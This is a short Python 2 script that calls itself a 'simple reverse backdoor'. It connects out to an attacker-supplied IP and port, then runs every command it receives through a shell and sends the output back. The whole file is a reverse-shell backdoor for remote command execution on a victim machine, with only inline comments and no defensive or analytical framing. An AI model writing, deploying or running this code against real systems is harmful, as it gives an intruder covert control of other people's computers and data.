#! /usr/bin/python
"""A simple reverse backdoor script.
   Uses Python 2.7.16"""

import subprocess
import optparse
import socket


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-a', '--attacker', dest='attacker', help='Attacking host IP.')
    parser.add_option('-p', '--port', dest='port', help='Port to connect to.')

    (options, arguments) = parser.parse_args()

    return options


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


options = get_arguments()

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 and TCP
connection.connect((options.attacker, options.port))            # establishes connection

connection.send('\n[+] Connection established.\n')              # verifies to attacker that connection is valid

while True:
    command = connection.recv(1024)                             # receives data from attacker max 1024 bytes at a time
    command_result = execute_system_command(command)
    connection.send(command_result)

    connection.close()                                              # closes connection
